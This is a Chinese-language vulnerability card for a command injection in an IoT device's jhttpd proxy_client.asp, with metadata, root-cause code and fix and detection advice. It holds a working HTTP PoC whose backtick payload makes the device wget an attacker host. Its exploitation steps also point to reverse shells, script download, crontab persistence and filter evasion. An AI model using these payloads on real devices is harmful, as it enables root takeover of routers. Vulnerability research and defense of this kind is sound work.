---
id: iot-jhttpd-proxy-client-asp-proxy-srv-command-injection
title: jhttpd proxy_client.asp 的 proxy_srv 命令注入：httpd_get_parm 取值经 nvram_set/snprintf 拼进 jhl_system，反引号执行 wget
type: scenario
domain: iot
path: iot
technique: jhttpd-cgi-param-shell-command-injection
aliases:
- jhttpd 命令注入
- proxy_client.asp proxy_srv 注入
- jhl_system 命令执行
- IoT 路由器命令注入
- proxy_srv 反引号注入
tags:
- iot
- jhttpd
- command-injection
- cgi
- nvram
- firmware
- router
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-V294
  verified_at: '2026-11-08T07:46:52+08:00'
  notes: 已对照原文与17张图核对：sub_47EAE8 以 httpd_get_parm 取 proxy_srv→nvram_set→snprintf("proxy_client ... %s ...")→jhl_system；PoC 反引号 wget 回连 192.168.0.2:9999/11，图17 显示 Python http.server 收到 GET /11，与卡一致。原文未给设备型号/固件版本，未设 affected_versions。dedup 最高候选 iot-dlink-di8100-upgrade-filter-asp-path-command-injection 为 related：端点/参数/命令模板均不同，非同一链。未本地复跑 PoC。
---

## 一句话结论

某 IoT 设备 jhttpd 的 `proxy_client.asp` 处理函数 `sub_47EAE8` 用 `httpd_get_parm` 取 `proxy_srv` 参数、写入 NVRAM 后，又用 `snprintf` 把它拼进 `proxy_client` 系统命令并交给 `jhl_system()` 执行，全程没有过滤 shell 元字符；`proxy_srv=111`wget http://attacker/11`` 即可让设备以 jhttpd 权限（通常 root）执行任意命令，文章用回连 HTTP 服务验证成功。

## 原理

- `proxy_client.asp` 是 jhttpd 的一个 CGI 接口，对应 handler `sub_47EAE8`（通过 `jhl_system` 交叉引用 + CGI 路由表 dump 定位）。核心逻辑：
  
  ```c
  v14 = httpd_get_parm(a1, "proxy_srv");   // 从 HTTP 请求取参数
  nvram_set("proxy_srv", v14);              // 写入 NVRAM（代理服务器地址）
  ...
  snprintf(cmd, sizeof(cmd), "proxy_client ... %s ...", v14);  // 拼系统命令
  jhl_system(cmd);                          // 交给 shell 执行
  ```
  
  `proxy_srv` 本应是代理服务器地址（IP/域名），代码未做字符白名单、长度/格式校验，也未用 `execve` 参数数组，而是直接 `snprintf` 进命令行。
- `jhl_system()` 是厂商封装的 `system()`/`popen()` 类函数，命令字符串会交给 `/bin/sh -c`，因此反引号 `` `...` ``、`$(...)`、`;`、`|`、`&&` 都能注入。文章 PoC 用反引号把 `wget` 包起来：
  
  ```
  proxy_srv=111`wget http://192.168.0.2:9999/11`
  ```
  
  最终命令大致是 `proxy_client ... 111`wget http://192.168.0.2:9999/11` ...`，shell 先执行反引号里的 `wget` 再拼回结果。
- `httpd_get_parm` 会对 URL 参数做解码，因此 PoC 里的 `%20`、`%3a`、`%2f` 会还原成空格/冒号/斜杠；`&` 分隔其他参数（`proxy_srvport`、`proxy_lanip`、`proxy_lanport`、`proxy_en`），说明该接口还有一组代理配置参数，`proxy_srv` 只是其中被拼进命令的一个。
- 为什么危险：jhttpd 通常以 root 运行（IoT 设备 Web 管理面），命令注入即 root RCE；接口在 Web 管理面暴露，文章 PoC 未展示登录流程/认证头，说明至少在该固件版本可直接请求。设备常被放在边界/内网，利用后可横向、持久化、加入僵尸网络。
- 审计线索：先按本文章另一张卡 dump `httpd_cgi_all_fun` 路由表，定位 `proxy_client.asp` 的 handler；再在 handler 中搜 `httpd_get_parm` → `nvram_set`/`snprintf` → `jhl_system`/`system`/`popen` 的污点路径。同类 jhttpd 设备可复用该模式找其他 `*.asp` 接口。

## 触发条件

- 目标运行存在该 `proxy_client.asp` handler 的 jhttpd 固件，Web 管理面可从攻击者网络访问（文章 PoC 未携带认证信息，具体版本是否要求登录以实测为准）。
- `proxy_srv` 参数被拼进 `jhl_system` 的命令字符串，未过滤反引号/`$()`/`;`/`|` 等元字符。
- 设备 shell 环境有 `wget`/`busybox` 等可用命令；jhttpd 以 root 或高权限运行。
- 攻击者有一个可被设备访问的回连/下载服务（文章用 Python HTTP server 监听 9999）。

## 利用步骤

1. 用 FirmAE/QEMU 仿真目标固件，确认 `http://<device>/proxy_client.asp` 可访问、参数被接受。
2. 在攻击机起监听：`python3 -m http.server 9999`。
3. 发送 PoC：
   
   ```
   GET /proxy_client.asp?proxy_srv=111`wget%20http%3a%2f%2f<attacker>%3a9999%2f11`&proxy_srvport=2&proxy_srvport=1&proxy_lanip=127.0.0.1&proxy_lanport=8080&proxy_en=1
   ```
   
   观察监听端是否收到 `/11` 请求；收到即命令执行成功。
4. 验证后可将反引号内容换成反弹 shell、下载并执行脚本、写 crontab/启动项等；注意设备可能无 bash，使用 busybox 兼容命令。
5. 若 `proxy_srv` 被 URL 解码两次或有长度限制，调整编码（`%60` 反引号、`%24%28` `$(` 等）或换用 `;`/`|`。

## PoC

```http
GET /proxy_client.asp?proxy_srv=111`wget%20http%3a%2f%2f192.168.0.2%3a9999%2f11`&proxy_srvport=2&proxy_srvport=1&proxy_lanip=127.0.0.1&proxy_lanport=8080&proxy_en=1 HTTP/1.1
Host: 192.168.0.1
```

监听端（攻击机）：

```bash
python3 -m http.server 9999
```

设备执行 `wget http://192.168.0.2:9999/11`，Python 日志出现 `GET /11` 即证明命令注入。原文在 FirmAE/QEMU 仿真环境中复现，回连请求确实到达攻击机 Web 服务。

## 变体与关联

- 同属 jhttpd/IoT 命令注入：`iot` 下已有 D-Link DI-8100 `upgrade_filter_asp`、D-Link DIR-615/645/815 `service.cgi`、TP-Link AX1800 `locale` 等卡；本卡差异是 **proxy_client.asp 的 proxy_srv + nvram_set + jhl_system** 这一具体 handler。
- 审计方法见本文章「jhttpd CGI 路由表提取」卡（code-analysis/reverse/firmware）：先 dump 路由→handler，再对每个 handler 查 `httpd_get_parm`→`jhl_system` 污点链。
- 变体：其他 `*.asp` 参数若进入 `snprintf` + `jhl_system` 同样可注入；反引号被过滤时可尝试 `$(...)`、`;`、`|`、换行、URL 双重编码。
- 设备型号/固件版本原文未明确命名，affected_versions 未标注；复现以仿真固件为准。

## 检测与防御

- 修复：`proxy_srv` 按 IP/域名白名单校验（只允许 `[A-Za-z0-9.-]`，长度限制），拒绝反引号/`$`/`;`/`|`/`&`/换行；不要用 `system` 拼命令，改用 `execve` 参数数组或厂商安全 API；`nvram_set` 前做同样校验。
- 固件：Web 管理面强口令 + 限制管理网段；关闭不必要的 CGI/调试接口；jhttpd 降权运行；对 `proxy_client` 命令使用固定参数模板。
- 检测：WAF/IDS 监控 `proxy_client.asp` 的 `proxy_srv` 出现反引号、`$(`、`;`、`|`、`%60`、`%24`；设备侧监控异常 `wget`/`curl`/`sh` 子进程与出站连接；审计 NVRAM 中 `proxy_srv` 值。
- 排查：检查 `proxy_srv` 是否被写入异常字符串、jhttpd 子进程与网络连接、设备是否下载了外部脚本/二进制。
